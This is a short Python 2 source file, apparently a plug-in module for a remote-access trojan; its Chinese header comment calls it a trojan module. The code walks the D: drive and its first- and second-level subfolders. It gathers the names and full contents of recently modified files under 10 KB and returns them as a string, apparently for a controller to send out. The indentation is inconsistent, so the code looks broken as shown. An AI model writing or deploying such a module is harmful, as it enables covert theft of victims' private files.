#encoding=utf-8
import os
import sys
import time
#---------------------------------------------------------------------
# 此木马模块只传输D盘下一级和二级目录下，修改时间在一周内，且文件大小小于10k的文件
#---------------------------------------------------------------------
ans=[]

def judgetime(name):
	fileinfo = os.stat(name)
	if ((time.time()-fileinfo.st_mtime)/(60*60*24))>7:
		return False
	else:
		return True

def judgesize(name):
	fileinfo = os.stat(name)
	if fileinfo.st_size>10000: #判断文件大小
		return False
	else:
		return True
	return True

#是二级目录
def is_dir(name):
	if name=="$RECYCLE.BIN":
		return
	path_name="D:\\"+name
	files=os.listdir(path_name)
	for i in range(0,len(files)):
		pname =path_name+'\\'+files[i] #绝对路径名
		#如果是文件
		if os.path.isdir(pname)==False:
			if judgetime(pname) and judgesize(pname):
				ans.append(files[i])
				fp=open(pname,'rb')
				content=fp.read()
				fp.close()
				ans.append(str(content))

def run(**args):
	print "[*] In file_return module. "
	#os.chdir("D:\\\\") #切换到D目录下
	files = os.listdir("D:\\")
	content=""
	for i in range(0,len(files)):
		#如果是文件
		path_name="D:\\"+files[i]
		print "%s" %path_name
		print os.path.isdir(path_name)
		if os.path.isdir(path_name)==False:
			if judgetime(path_name) and judgesize(path_name):
				ans.append(files[i])
				fp=open(path_name,'rb')
				content=fp.read()
				fp.close()
				ans.append(str(content))

        if os.path.isdir(path_name)==True:#如果是二级目录
		    print "[+]"+path_name
		    if judgetime(path_name):
				is_dir(files[i])

	return str(ans)
